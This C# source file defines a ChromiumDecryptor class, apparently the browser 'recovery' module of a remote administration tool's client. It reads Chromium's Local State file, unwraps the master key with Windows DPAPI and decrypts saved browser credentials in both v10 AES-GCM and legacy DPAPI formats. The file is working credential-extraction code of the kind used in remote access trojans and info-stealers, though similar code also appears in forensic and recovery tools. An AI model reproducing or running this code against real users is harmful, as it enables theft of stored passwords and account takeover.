using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;

namespace RemoteAdmin.Client.Recovery.Browsers
{
    /// <summary>
    /// Provides methods to decrypt Chromium credentials using BouncyCastle.
    /// </summary>
    public class ChromiumDecryptor
    {
        private readonly byte[] _key;
        private readonly string _browserName;

        public ChromiumDecryptor(string localStatePath, string browserName = "Unknown")
        {
            _browserName = browserName;

            try
            {
                if (!File.Exists(localStatePath))
                {
                    Console.WriteLine($"[{_browserName}] Local State file not found: {localStatePath}");
                    return;
                }

                string localState = File.ReadAllText(localStatePath);
                Console.WriteLine($"[{_browserName}] Local State file loaded, length: {localState.Length}");

                // Try multiple methods to extract the key
                _key = ExtractKeyMethod1(localState) ?? ExtractKeyMethod2(localState);

                if (_key != null)
                {
                    Console.WriteLine($"[{_browserName}] Master key extracted successfully, length: {_key.Length}");
                }
                else
                {
                    Console.WriteLine($"[{_browserName}] Failed to extract master key");
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[{_browserName}] Error in constructor: {e.Message}");
            }
        }

        private byte[] ExtractKeyMethod1(string localState)
        {
            try
            {
                // Method 1: Simple string search
                var keyStart = localState.IndexOf("\"encrypted_key\":\"");
                if (keyStart == -1)
                {
                    Console.WriteLine($"[{_browserName}] Method1: encrypted_key not found");
                    return null;
                }

                keyStart += 17;
                var keyEnd = localState.IndexOf("\"", keyStart);

                if (keyEnd == -1)
                {
                    Console.WriteLine($"[{_browserName}] Method1: End quote not found");
                    return null;
                }

                var encKeyStr = localState.Substring(keyStart, keyEnd - keyStart);
                Console.WriteLine($"[{_browserName}] Method1: Base64 key length: {encKeyStr.Length}");

                var encryptedKey = Convert.FromBase64String(encKeyStr);
                Console.WriteLine($"[{_browserName}] Method1: Encrypted key bytes: {encryptedKey.Length}");

                // Skip DPAPI prefix (usually "DPAPI")
                if (encryptedKey.Length <= 5)
                {
                    Console.WriteLine($"[{_browserName}] Method1: Key too short");
                    return null;
                }

                var encryptedKeyWithoutPrefix = encryptedKey.Skip(5).ToArray();
                var decryptedKey = ProtectedData.Unprotect(encryptedKeyWithoutPrefix, null, DataProtectionScope.CurrentUser);

                Console.WriteLine($"[{_browserName}] Method1: Success! Decrypted key length: {decryptedKey.Length}");
                return decryptedKey;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[{_browserName}] Method1 failed: {ex.Message}");
                return null;
            }
        }

        private byte[] ExtractKeyMethod2(string localState)
        {
            try
            {
                // Method 2: Alternative parsing
                var subStr = localState.IndexOf("encrypted_key") + "encrypted_key".Length + 3;
                var encKeyStr = localState.Substring(subStr).Substring(0, localState.Substring(subStr).IndexOf('"'));

                Console.WriteLine($"[{_browserName}] Method2: Base64 key length: {encKeyStr.Length}");

                var encryptedKey = Convert.FromBase64String(encKeyStr);
                var encryptedKeyWithoutPrefix = encryptedKey.Skip(5).ToArray();

                var decryptedKey = ProtectedData.Unprotect(encryptedKeyWithoutPrefix, null, DataProtectionScope.CurrentUser);
                Console.WriteLine($"[{_browserName}] Method2: Success! Decrypted key length: {decryptedKey.Length}");
                return decryptedKey;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[{_browserName}] Method2 failed: {ex.Message}");
                return null;
            }
        }

        public string Decrypt(byte[] cipherBytes)
        {
            try
            {
                if (cipherBytes == null || cipherBytes.Length == 0)
                {
                    return string.Empty;
                }

                // Check for v10 prefix (AES-GCM)
                if (cipherBytes.Length > 31 &&
                    cipherBytes[0] == 'v' && cipherBytes[1] == '1' && cipherBytes[2] == '0')
                {
                    if (_key == null)
                    {
                        Console.WriteLine($"[{_browserName}] Cannot decrypt v10: No master key");
                        return string.Empty;
                    }

                    return DecryptV10(cipherBytes);
                }

                // Try legacy DPAPI
                return DecryptDPAPI(cipherBytes);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[{_browserName}] Decrypt failed: {ex.Message}");
                return string.Empty;
            }
        }

        private string DecryptV10(byte[] cipherBytes)
        {
            try
            {
                // Extract components
                var nonce = new byte[12];
                Array.Copy(cipherBytes, 3, nonce, 0, 12);

                var cipherTextWithTag = new byte[cipherBytes.Length - 15];
                Array.Copy(cipherBytes, 15, cipherTextWithTag, 0, cipherTextWithTag.Length);

                // Initialize BouncyCastle AES-GCM
                var cipher = new GcmBlockCipher(new AesEngine());
                var parameters = new AeadParameters(new KeyParameter(_key), 128, nonce);
                cipher.Init(false, parameters);

                // Decrypt
                var plainText = new byte[cipher.GetOutputSize(cipherTextWithTag.Length)];
                var len = cipher.ProcessBytes(cipherTextWithTag, 0, cipherTextWithTag.Length, plainText, 0);
                cipher.DoFinal(plainText, len);

                var result = Encoding.UTF8.GetString(plainText).TrimEnd('\0');

                if (!string.IsNullOrEmpty(result))
                {
                    Console.WriteLine($"[{_browserName}] v10 decryption successful, length: {result.Length}");
                }

                return result;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[{_browserName}] v10 decryption error: {ex.Message}");
                return string.Empty;
            }
        }

        private string DecryptDPAPI(byte[] cipherBytes)
        {
            try
            {
                var decrypted = ProtectedData.Unprotect(cipherBytes, null, DataProtectionScope.CurrentUser);
                var result = Encoding.UTF8.GetString(decrypted);

                if (!string.IsNullOrEmpty(result))
                {
                    Console.WriteLine($"[{_browserName}] DPAPI decryption successful, length: {result.Length}");
                }

                return result;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[{_browserName}] DPAPI decryption error: {ex.Message}");
                return string.Empty;
            }
        }

        // Compatibility overload
        public string Decrypt(string cipherText)
        {
            var cipherTextBytes = Encoding.Default.GetBytes(cipherText);
            return Decrypt(cipherTextBytes);
        }
    }
}